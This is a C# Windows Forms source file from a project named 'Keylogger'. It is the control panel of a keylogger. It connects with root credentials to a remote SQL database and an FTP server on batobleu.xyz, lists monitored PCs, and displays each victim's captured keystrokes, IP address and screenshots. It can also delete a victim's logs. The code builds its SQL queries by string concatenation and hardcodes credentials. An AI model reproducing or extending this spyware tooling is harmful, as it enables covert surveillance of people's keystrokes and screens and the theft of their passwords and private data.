using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Data.SqlClient;
using FluentFTP;
using System.Net;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        public static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;password=";
        public static SqlConnection cnxSQLServer = new SqlConnection(log);
        public static SqlCommand cmdListNomPC = cnxSQLServer.CreateCommand();
        public static string[] listNomPcArray = new string[256];
        public static int x;
        public static SqlCommand cmdRequeteSQL = cnxSQLServer.CreateCommand();
        public static SqlCommand cmdImageSQL = cnxSQLServer.CreateCommand();
        public static SqlCommand cmdResetBase = cnxSQLServer.CreateCommand();
        public static SqlCommand cmdIpPC = cnxSQLServer.CreateCommand();
        public static bool ftpconnect = false;
        public static List<int> idKeylog = new List<int>();
        public static List<string> dateheure = new List<string>();
        public static int compteur = 0;
        public static string nomFichier;
        public static FtpClient client = new FtpClient("ftp.batobleu.xyz");


        public Form1()
        {
            int nbPC = 0;
            InitializeComponent();
            try
            {
                cnxSQLServer.Open();
                MessageBox.Show("Connexion OK !");
            }
            catch (Exception exc)
            {
                MessageBox.Show(Convert.ToString(exc));
            }
            cmdListNomPC.CommandText = " SELECT DISTINCT labelPC FROM keylog ";
            SqlDataReader listNomPC = cmdListNomPC.ExecuteReader();
            if (listNomPC != null)
            {
                while (listNomPC.Read())
                {
                    string s = (string)listNomPC["labelPC"].ToString();
                    comboBox_nomPC.Items.Add(s);
                    listNomPcArray[nbPC] = s;
                    nbPC++;
                }
            }
            listNomPC.Close();
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(OnProcessExit);
        }

        private void button_requete_Click(object sender, EventArgs e)
        {
            listBox_requeteResult.Items.Clear();
            x = comboBox_nomPC.SelectedIndex;
            if (x == -1)
            {
                MessageBox.Show("Selectionné un PC");
            }
            else
            {
                if (checkBox_screen.Checked == true)
                {
                    cmdRequeteSQL.CommandText = " SELECT * FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "' AND keylog = 'screenshot'  order by idKeylog ASC ";
                }
                else
                {
                    cmdRequeteSQL.CommandText = " SELECT * FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "' AND keylog != 'screenshot'  order by idKeylog ASC ";
                }
                SqlDataReader readerSQLServer = cmdRequeteSQL.ExecuteReader();
                if (readerSQLServer != null)
                {
                    while (readerSQLServer.Read())
                    {
                        string requete = (string)readerSQLServer["idKeylog"].ToString() + " - " + (string)readerSQLServer["keylog"].ToString() + " - " + (string)readerSQLServer["dateKeylog"].ToString();
                        listBox_requeteResult.Items.Add(requete);
                        idKeylog.Add(Convert.ToInt32((string)readerSQLServer["idKeylog"].ToString()));
                        dateheure.Add((string)readerSQLServer["dateKeylog"].ToString());
                    }
                }
                readerSQLServer.Close();
                cmdIpPC.CommandText = " SELECT ipPC FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "' AND idKeylog = (SELECT MAX(idKeylog) FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "') ";
                SqlDataReader readerIpPC = cmdIpPC.ExecuteReader();
                if (readerIpPC != null)
                {
                    while (readerIpPC.Read())
                    {
                        label_ipPC.Text = (string)readerIpPC["ipPC"].ToString();
                    }
                }
                readerIpPC.Close();
            }
        }

        private void listBox_requeteResult_SelectedValueChanged(object sender, EventArgs e)
        {
            client.Credentials = new NetworkCredential("11793_nexis", "");
            if (ftpconnect == false)
            {
                client.Connect();
                ftpconnect = true;
                int x = listBox_requeteResult.SelectedIndex;
                cmdImageSQL.CommandText = "SELECT dateKeylog, labelPC FROM keylog WHERE idKeylog = " + Convert.ToString(idKeylog[x]);
                SqlDataReader readerSQLServer = cmdImageSQL.ExecuteReader();
                if (readerSQLServer != null)
                {
                    while (readerSQLServer.Read())
                    {
                        string dateFormat = Convert.ToDateTime((string)readerSQLServer["dateKeylog"].ToString()).ToString("dd_MM_yyyy HH_mm_ss");
                        nomFichier = dateFormat + ".png";
                        string cheminFichier = "/keylog/" + (string)readerSQLServer["labelPC"].ToString() + "/" + nomFichier;
                        try
                        {
                            client.DownloadFile("./" + nomFichier, cheminFichier);
                            long size = (new FileInfo("./" + nomFichier)).Length;
                            FileStream fs = new FileStream("./" + nomFichier, FileMode.Open, FileAccess.Read);
                            byte[] data = new byte[size];
                            fs.Read(data, 0, (int)size);
                            var image = Image.FromStream(fs);
                            pictureBox_screenshot.Image = image;
                            fs.Close();
                        }
                        catch (Exception exs)
                        {
                            MessageBox.Show(exs.ToString(), "Error");
                        }
                        break;
                    }
                }
                readerSQLServer.Close();
            }
            else
            {
                File.Delete("./" + nomFichier);
                int x = listBox_requeteResult.SelectedIndex;
                cmdImageSQL.CommandText = "SELECT dateKeylog, labelPC FROM keylog WHERE idKeylog = " + Convert.ToString(idKeylog[x]);
                SqlDataReader readerSQLServer = cmdImageSQL.ExecuteReader();
                if (readerSQLServer != null)
                {
                    while (readerSQLServer.Read())
                    {
                        string dateFormat = Convert.ToDateTime((string)readerSQLServer["dateKeylog"].ToString()).ToString("dd_MM_yyyy HH_mm_ss");
                        nomFichier = dateFormat + ".png";
                        string cheminFichier = "/keylog/" + (string)readerSQLServer["labelPC"].ToString() + "/" + nomFichier;
                        try
                        {
                            client.DownloadFile("./" + nomFichier, cheminFichier);
                            long size = (new FileInfo("./" + nomFichier)).Length;
                            FileStream fs = new FileStream("./" + nomFichier, FileMode.Open, FileAccess.Read);
                            byte[] data = new byte[size];
                            fs.Read(data, 0, (int)size);
                            var image = Image.FromStream(fs);
                            pictureBox_screenshot.Image = image;
                            fs.Close();
                        }
                        catch (Exception exs)
                        {
                            MessageBox.Show(exs.ToString(),"Error");
                        }
                        break;
                    }
                }
                readerSQLServer.Close();
            }
        }

        private void pictureBox_screenshot_Click(object sender, EventArgs e)
        {
            System.Diagnostics.ProcessStartInfo ouvrirImage = new System.Diagnostics.ProcessStartInfo(nomFichier, "");
            System.Diagnostics.Process.Start(ouvrirImage);
        }

        static void OnProcessExit(object sender, EventArgs e)
        {
            try
            {
                File.Delete("./" + nomFichier);
            }
            catch
            {

            }
        }

        private void button_resetTable_Click(object sender, EventArgs e)
        {
            DialogResult resetTable = MessageBox.Show("Voulez vous reset la base de donnée pour labelPC = " + listNomPcArray[x] + " ?", "Confirmation", MessageBoxButtons.YesNo);
            if (resetTable == DialogResult.Yes)
            {
                cmdResetBase.CommandText = "DELETE FROM keylog WHERE labelPC = '" + listNomPcArray[x] + "'";
                cmdResetBase.ExecuteNonQuery();
                client.DeleteDirectory("/keylog/" + listNomPcArray[x] + "/");

            }
        }

    }
}
